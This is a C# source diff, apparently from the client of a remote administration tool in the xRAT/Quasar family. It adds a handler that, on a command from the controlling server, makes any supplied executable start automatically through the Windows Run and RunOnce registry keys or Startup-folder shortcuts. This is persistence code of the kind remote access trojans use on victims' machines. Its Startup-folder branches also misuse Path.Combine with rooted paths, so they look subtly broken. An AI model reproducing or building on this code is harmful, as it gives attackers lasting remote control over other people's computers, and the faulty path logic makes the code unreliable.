@@ -598,7 +598,7 @@ namespace xClient.Core.Commands
 			}
 		}
 
-		public static void HandleGetStartupItems(object command, Client client)
+		public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
 		{
 			try
 			{
@@ -642,6 +642,84 @@ namespace xClient.Core.Commands
 			catch
 			{
 				new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
+			}
+		}
+
+		public static void HandleAddStartupItem(Packets.ServerPackets.AddStartupItem command, Client client)
+		{
+			try
+			{
+				switch (command.Type)
+				{
+					case 0:
+						using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+						{
+							if (key == null) throw new Exception();
+							if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\"")) command.Path = "\"" + command.Path + "\"";
+							key.SetValue(command.Name, command.Path);
+						}
+						break;
+					case 1:
+						using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+						{
+							if (key == null) throw new Exception();
+							if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\"")) command.Path = "\"" + command.Path + "\"";
+							key.SetValue(command.Name, command.Path);
+						}
+						break;
+					case 2:
+						using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+						{
+							if (key == null) throw new Exception();
+							if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\"")) command.Path = "\"" + command.Path + "\"";
+							key.SetValue(command.Name, command.Path);
+						}
+						break;
+					case 3:
+						using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+						{
+							if (key == null) throw new Exception();
+							if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\"")) command.Path = "\"" + command.Path + "\"";
+							key.SetValue(command.Name, command.Path);
+						}
+						break;
+					case 4:
+						if (!Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+							throw new Exception();
+
+						string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+							"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
+
+						using (var writer = new StreamWriter(lnkPath, false))
+						{
+							writer.WriteLine("[InternetShortcut]");
+							writer.WriteLine("URL=file:///" + command.Path);
+							writer.WriteLine("IconIndex=0");
+							writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
+							writer.Flush();
+						}
+						break;
+					case 5:
+						if (!Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+							throw new Exception();
+
+						string lnkPath2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+							"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
+
+						using (var writer = new StreamWriter(lnkPath2, false))
+						{
+							writer.WriteLine("[InternetShortcut]");
+							writer.WriteLine("URL=file:///" + command.Path);
+							writer.WriteLine("IconIndex=0");
+							writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
+							writer.Flush();
+						}
+						break;
+				}
+			}
+			catch
+			{
+				new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
 			}
 		}
 	}
